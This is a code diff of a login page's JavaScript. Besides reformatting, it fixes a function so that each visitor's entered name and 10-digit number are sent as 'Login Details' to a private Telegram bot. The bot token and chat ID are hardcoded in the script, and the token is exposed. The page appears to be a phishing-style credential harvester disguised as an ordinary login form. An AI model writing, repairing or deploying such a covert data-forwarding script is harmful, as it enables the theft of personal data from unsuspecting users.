@@ -82,126 +82,130 @@
     </div>
 
     <script>
-      // Generate random CAPTCHA
-      function generateCaptcha() {
-        const randomCaptcha = Math.floor(10000 + Math.random() * 90000);
-        document.getElementById("captcha-text").innerText = randomCaptcha;
-      }
+// Generate random CAPTCHA
+function generateCaptcha() {
+  const randomCaptcha = Math.floor(10000 + Math.random() * 90000);
+  document.getElementById("captcha-text").innerText = randomCaptcha;
+}
 
-      // Update the clock display
-      function updateClock() {
-        const now = new Date();
-        let hours = now.getHours();
-        const minutes = now.getMinutes().toString().padStart(2, "0");
-        const seconds = now.getSeconds().toString().padStart(2, "0");
-        const amPm = hours >= 12 ? "PM" : "AM";
-        hours = hours % 12 || 12;
-        const timeString = `${hours}:${minutes}:${seconds} ${amPm}`;
-        document.getElementById("clock").innerText = timeString;
-      }
+// Update the clock display
+function updateClock() {
+  const now = new Date();
+  let hours = now.getHours();
+  const minutes = now.getMinutes().toString().padStart(2, "0");
+  const seconds = now.getSeconds().toString().padStart(2, "0");
+  const amPm = hours >= 12 ? "PM" : "AM";
+  hours = hours % 12 || 12;
+  const timeString = `${hours}:${minutes}:${seconds} ${amPm}`;
+  document.getElementById("clock").innerText = timeString;
+}
 
-      // Ensure only numeric input is allowed for the number field
-      function validateNumberInput(input) {
-        input.value = input.value.replace(/[^0-9]/g, "");
-      }
+// Ensure only numeric input is allowed for the number field
+function validateNumberInput(input) {
+  input.value = input.value.replace(/[^0-9]/g, "");
+}
 
-      // Redirect if cookies are already set
-      function checkCookiesAndRedirect() {
-        const userName = getCookie("userName");
-        const userNumber = getCookie("userNumber");
+// Redirect if cookies are already set
+function checkCookiesAndRedirect() {
+  const userName = getCookie("userName");
+  const userNumber = getCookie("userNumber");
 
-        if (userName && userNumber) {
-          window.location.href = "home.html";
-        }
-      }
+  if (userName && userNumber) {
+    window.location.href = "home.html";
+  }
+}
 
-      // Validate and process login
-      function validateAndProcess() {
-        const name = document.getElementById("name").value.trim();
-        const message = document.getElementById("message").value.trim();
-        const captchaInput = document.getElementById("captcha-input").value.trim();
-        const captchaText = document.getElementById("captcha-text").innerText.trim();
+// Validate and process login
+function validateAndProcess() {
+  const name = document.getElementById("name").value.trim();
+  const message = document.getElementById("message").value.trim();
+  const captchaInput = document.getElementById("captcha-input").value.trim();
+  const captchaText = document.getElementById("captcha-text").innerText.trim();
 
-        const nameError = document.getElementById("name-error");
-        const numberError = document.getElementById("number-error");
-        const captchaError = document.getElementById("captcha-error");
+  const nameError = document.getElementById("name-error");
+  const numberError = document.getElementById("number-error");
+  const captchaError = document.getElementById("captcha-error");
 
-        let isValid = true;
+  let isValid = true;
 
-        if (!name) {
-          nameError.style.display = "block";
-          isValid = false;
-        } else {
-          nameError.style.display = "none";
-        }
+  // Validate name
+  if (!name) {
+    nameError.style.display = "block";
+    isValid = false;
+  } else {
+    nameError.style.display = "none";
+  }
 
-        if (message.length !== 10) {
-          numberError.style.display = "block";
-          isValid = false;
-        } else {
-          numberError.style.display = "none";
-        }
+  // Validate number
+  if (message.length !== 10) {
+    numberError.style.display = "block";
+    isValid = false;
+  } else {
+    numberError.style.display = "none";
+  }
 
-        if (captchaInput !== captchaText) {
-          captchaError.style.display = "block";
-          isValid = false;
-        } else {
-          captchaError.style.display = "none";
-        }
+  // Validate CAPTCHA
+  if (captchaInput !== captchaText) {
+    captchaError.style.display = "block";
+    isValid = false;
+  } else {
+    captchaError.style.display = "none";
+  }
 
-        if (isValid) {
-          setCookie("userName", name, 7);
-          setCookie("userNumber", message, 7);
-          sendToTelegram({ name, message });
-          window.location.href = "home.html";
-        }
-      }
+  // Process valid inputs
+  if (isValid) {
+    setCookie("userName", name, 7);
+    setCookie("userNumber", message, 7);
+    sendToTelegram(name, message);
+    window.location.href = "home.html";
+  }
+}
 
-      // Send data to Telegram
-      function sendToTelegram(name,message) {
-        const chatId = "5786268361";
-        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc";
-        const message = `Login Details:\nName: ${data.name}\nNumber: ${data.message}`;
+// Send data to Telegram
+function sendToTelegram(name, message) {
+  const chatId = "5786268361";
+  const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc";
+  const telegramMessage = `Login Details:\nName: ${name}\nNumber: ${message}`;
 
-        fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
-            message
-          )}`
-        )
-          .then((res) => res.json())
-          .then((data) => console.log("Telegram Response:", data))
-          .catch((err) => console.error("Telegram Error:", err));
-      }
+  fetch(
+    `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+      telegramMessage
+    )}`
+  )
+    .then((res) => res.json())
+    .then((data) => console.log("Telegram Response:", data))
+    .catch((err) => console.error("Telegram Error:", err));
+}
 
-      // Set a cookie
-      function setCookie(name, value, days) {
-        const date = new Date();
-        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
-        const expires = "expires=" + date.toUTCString();
-        document.cookie =
-          name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
-      }
+// Set a cookie
+function setCookie(name, value, days) {
+  const date = new Date();
+  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+  const expires = "expires=" + date.toUTCString();
+  document.cookie =
+    name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+}
 
-      // Get a cookie value by name
-      function getCookie(name) {
-        const nameEQ = name + "=";
-        const cookies = document.cookie.split(";");
-        for (let i = 0; i < cookies.length; i++) {
-          let cookie = cookies[i].trim();
-          if (cookie.indexOf(nameEQ) === 0) {
-            return decodeURIComponent(cookie.substring(nameEQ.length));
-          }
-        }
-        return null;
-      }
+// Get a cookie value by name
+function getCookie(name) {
+  const nameEQ = name + "=";
+  const cookies = document.cookie.split(";");
+  for (let i = 0; i < cookies.length; i++) {
+    let cookie = cookies[i].trim();
+    if (cookie.indexOf(nameEQ) === 0) {
+      return decodeURIComponent(cookie.substring(nameEQ.length));
+    }
+  }
+  return null;
+}
 
-      // Initialize the script after the page has fully loaded
-      document.addEventListener("DOMContentLoaded", () => {
-        updateClock();
-        checkCookiesAndRedirect();
-        generateCaptcha();
-        setInterval(updateClock, 1000);
-      });
-    </script>
-  </body>
+// Initialize the script after the page has fully loaded
+document.addEventListener("DOMContentLoaded", () => {
+  updateClock();
+  checkCookiesAndRedirect();
+  generateCaptcha();
+  setInterval(updateClock, 1000);
+});
+</Script>
+</body>
 </html>
